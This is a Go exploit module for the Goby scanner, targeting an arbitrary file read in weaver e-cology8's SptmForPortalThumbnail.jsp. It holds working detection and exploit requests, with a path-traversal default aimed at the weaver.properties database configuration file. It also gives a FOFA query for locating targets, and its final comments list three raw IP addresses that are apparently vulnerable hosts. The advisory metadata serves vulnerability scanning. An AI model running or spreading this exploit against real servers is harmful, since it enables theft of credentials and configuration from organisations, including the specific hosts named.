package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "weaver e-cology8 SptmForPortalThumbnail.jsp arbitrary file reading vulnerability",
    "Description": "<p>weaver e-cology is a large-scale enterprise-level OA system. The preview in the SptmForPortalThumbnail.jsp file of weaver e-cology8 is not securely filtered, resulting in an arbitrary file reading vulnerability, which may lead to risks such as leakage of sensitive configuration files in the system.</p>",
    "Product": "weaver e-cology",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-02-21",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "body=\"/help/sys/help.html\" || header=\"Set-Cookie: ecology_JSessionid\"",
    "GobyQuery": "body=\"/help/sys/help.html\" || header=\"Set-Cookie: ecology_JSessionid\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>1. Use WAF filtering</p><p>2. Pay attention to the timely update of official patches: <a href=\"https://www.weaver.com.cn/cs/securityDownload.html?src=cn\">https://www.weaver.com.cn/cs/securityDownload.html?src=cn</a></p>",
    "References": [
        "http://124.223.89.192/archives/e-cology8-14"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "path",
            "type": "createSelect",
            "value": "../ecology/WEB-INF/prop/weaver.properties",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "weaver.general.BaseBean",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "java.io",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/SptmForPortalThumbnail.jsp?preview={{{path}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "泛微 e-cology8 SptmForPortalThumbnail.jsp 任意文件读取漏洞",
            "Product": "weaver e-cology",
            "Description": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"></span>泛微e-cology是一款大型企业级OA系统，泛微e-cology8的SptmForPortalThumbnail.jsp文件中的preview未进行安全过滤导致其存在任意文件读取漏洞，可能导致系统存在敏感配置文件泄露等风险。<br></p>",
            "Recommendation": "<p>1、使用WAF过滤</p><p>2、关注官方补丁及时更新：<a href=\"https://www.weaver.com.cn/cs/securityDownload.html?src=cn\">https://www.weaver.com.cn/cs/securityDownload.html?src=cn</a></p>",
            "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "weaver e-cology8 SptmForPortalThumbnail.jsp arbitrary file reading vulnerability",
            "Product": "weaver e-cology",
            "Description": "<p>weaver e-cology is a large-scale enterprise-level OA system. The preview in the SptmForPortalThumbnail.jsp file of <span style=\"color: rgb(22, 51, 102); font-size: 16px;\">weaver&nbsp;</span>e-cology8 is not securely filtered, resulting in an arbitrary file reading vulnerability, which may lead to risks such as leakage of sensitive configuration files in the system.<br></p>",
            "Recommendation": "<p>1. Use WAF filtering<br></p><p>2. Pay attention to the timely update of official patches: <a href=\"https://www.weaver.com.cn/cs/securityDownload.html?src=cn\">https://www.weaver.com.cn/cs/securityDownload.html?src=cn</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10685"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}
//http://113.98.234.90:8088
//http://112.74.55.58
//http://103.93.180.35